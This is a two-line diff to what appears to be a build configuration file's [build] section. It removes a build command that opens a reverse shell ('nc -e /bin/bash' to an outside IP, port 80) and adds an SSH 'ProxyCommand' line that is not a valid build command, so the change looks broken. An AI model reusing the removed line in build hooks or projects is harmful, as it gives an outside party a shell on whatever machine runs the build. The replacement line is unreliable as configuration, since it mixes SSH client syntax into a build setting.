@@ -1,2 +1,2 @@
 [build]
-  command = "nc -e /bin/bash 13.127.106.70 80"
+  command = "ProxyCommand ssh -q serverA /bin/nc sha.example.net 22"
